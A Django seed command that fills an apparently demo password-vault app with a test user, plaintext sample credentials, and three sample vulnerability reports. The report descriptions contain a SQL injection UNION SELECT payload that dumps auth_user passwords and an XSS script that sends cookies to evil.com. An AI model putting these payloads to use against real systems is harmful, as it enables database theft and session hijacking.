from django.contrib.auth.models import User
from django.core.management.base import BaseCommand
from vault.models import Credential
from vulnerabilities.models import VulnerabilityReport


CREDENTIALS = [
    dict(site_name='GitHub',      username='jdoe@example.com',    password='Gh!tHubP@ss2024',  notes='Personal account'),
    dict(site_name='AWS Console', username='john.doe',            password='Aws$ecure#9981',   notes='Production environment — use MFA'),
    dict(site_name='Cloudflare',  username='jdoe+cf@example.com', password='Cl0udFl4re!99',    notes='DNS management account'),
]

REPORTS = [
    dict(
        title='SQL Injection in user search endpoint',
        severity=VulnerabilityReport.Severity.CRITICAL,
        status=VulnerabilityReport.Status.OPEN,
        affected_system='User Search API — /api/users/search/',
        description=(
            'The user search endpoint concatenates unsanitised input directly into a raw SQL query. '
            'An attacker can extract the full users table by appending UNION SELECT payloads. '
            'Steps to reproduce: GET /api/users/search/?q=\' UNION SELECT username,password,3 FROM auth_user--\n'
            'Impact: Full database read access including password hashes and session tokens.'
        ),
    ),
    dict(
        title='Stored XSS via vulnerability report description field',
        severity=VulnerabilityReport.Severity.HIGH,
        status=VulnerabilityReport.Status.IN_PROGRESS,
        affected_system='Vulnerability Report submission form',
        description=(
            'The description field in the vulnerability report form does not sanitise HTML before rendering. '
            'An attacker can inject a <script> tag that executes in the context of any user who views the report. '
            'Steps to reproduce: Submit a report with description: <script>document.location="https://evil.com?c="+document.cookie</script>\n'
            'Impact: Session hijacking for any admin who reviews the report.'
        ),
    ),
    dict(
        title='Missing rate limiting on login endpoint',
        severity=VulnerabilityReport.Severity.MEDIUM,
        status=VulnerabilityReport.Status.FIXED,
        affected_system='Login endpoint — /accounts/login/',
        description=(
            'The login endpoint has no rate limiting or account lockout, allowing unlimited password guessing attempts. '
            'An attacker can perform a brute-force or credential-stuffing attack without any throttling. '
            'Steps to reproduce: Submit 1000+ POST requests to /accounts/login/ — no 429 or lockout is triggered.\n'
            'Recommended fix: Add django-ratelimit or implement exponential backoff after 5 failed attempts.'
        ),
    ),
]


class Command(BaseCommand):
    help = 'Seed the database with a test user, sample credentials, and vulnerability reports.'

    def add_arguments(self, parser):
        parser.add_argument(
            '--flush', action='store_true',
            help='Delete existing seed data before re-creating it.'
        )

    def handle(self, *args, **options):
        if options['flush']:
            User.objects.filter(username='testuser').delete()
            self.stdout.write(self.style.WARNING('Flushed existing seed data.'))

        # ── Test user ────────────────────────────────────────────────────────
        user, created = User.objects.get_or_create(
            username='testuser',
            defaults=dict(email='testuser@cybervault.local', is_active=True),
        )
        if created:
            user.set_password('TestUser@123')
            user.save()
            self.stdout.write(self.style.SUCCESS('Created test user "testuser" / TestUser@123'))
        else:
            self.stdout.write(self.style.WARNING('Test user "testuser" already exists — skipping.'))

        # ── Credentials ──────────────────────────────────────────────────────
        cred_created = 0
        for data in CREDENTIALS:
            _, c = Credential.objects.get_or_create(
                owner=user,
                site_name=data['site_name'],
                defaults=dict(username=data['username'], password=data['password'], notes=data['notes']),
            )
            if c:
                cred_created += 1

        if cred_created:
            self.stdout.write(self.style.SUCCESS(f'Created {cred_created} credential(s).'))
        else:
            self.stdout.write(self.style.WARNING('Credentials already exist — skipping.'))

        # ── Vulnerability reports ────────────────────────────────────────────
        report_created = 0
        for data in REPORTS:
            _, c = VulnerabilityReport.objects.get_or_create(
                reporter=user,
                title=data['title'],
                defaults=dict(
                    severity=data['severity'],
                    status=data['status'],
                    affected_system=data['affected_system'],
                    description=data['description'],
                ),
            )
            if c:
                report_created += 1

        if report_created:
            self.stdout.write(self.style.SUCCESS(f'Created {report_created} vulnerability report(s).'))
        else:
            self.stdout.write(self.style.WARNING('Vulnerability reports already exist — skipping.'))

        self.stdout.write('')
        self.stdout.write('Seed complete. Test account credentials:')
        self.stdout.write(f'  Regular user : testuser / TestUser@123')
        self.stdout.write(f'  Login at     : http://127.0.0.1:8000/accounts/login/')
